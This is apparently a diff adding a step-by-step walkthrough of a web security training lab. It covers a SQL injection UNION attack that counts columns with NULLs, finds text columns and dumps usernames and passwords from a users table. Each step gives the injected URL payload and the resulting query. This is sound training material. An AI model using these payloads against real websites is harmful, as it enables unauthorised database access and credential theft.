@@ -1,0 +1,33 @@
+Objective: SQL injection UNION attack, retrieving data from other tables
+
+End Goal: Exploit the SQL inject vulnerablity to reveal sensitive data such as usernames and passwords
+
+Step 1:
+Check and see if there's SQL injection vulnerablity in the given site
+https://0ac700b30418e5bd802fea2b00430036.web-security-academy.net/filter?category='
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '''
+Observation: Show internal server error
+
+Step 2:
+Inject SQL without causing internal server error
+https://0ac700b30418e5bd802fea2b00430036.web-security-academy.net/filter?category='--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = ''
+Observation: There's no internal server error
+
+Step 3:
+Determine the number of columns in the table using UNION and NULLs
+https://0ac700b30418e5bd802fea2b00430036.web-security-academy.net/filter?category=' UNION SELECT NULL, NULL--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '' UNION SELECT NULL, NULL
+Observation: See if there's error, if not keep adding NULLs to get no error, that means, the number of NULLs matchs column number on the table.
+
+Step 4:
+Determine the number of columns that are text type, to do that replace each NULL with 'abc' or random text, if there' an error, replace the next NULL and continue
+https://0ac700b30418e5bd802fea2b00430036.web-security-academy.net/filter?category=' UNION SELECT 'abc', NULL--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '' UNION SELECT 'abc', NULL
+Observation: See if there's error, if not keep replacing NULLs with text strings to get no error, this way you'll know which columns are text type.
+
+Step 5:
+Reveal username and password using the found text columns
+https://0ac700b30418e5bd802fea2b00430036.web-security-academy.net/filter?category=' UNION SELECT username, password FROM users--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '' UNION SELECT username, password FROM users
+This will reveal the all usernames and passwords on the website
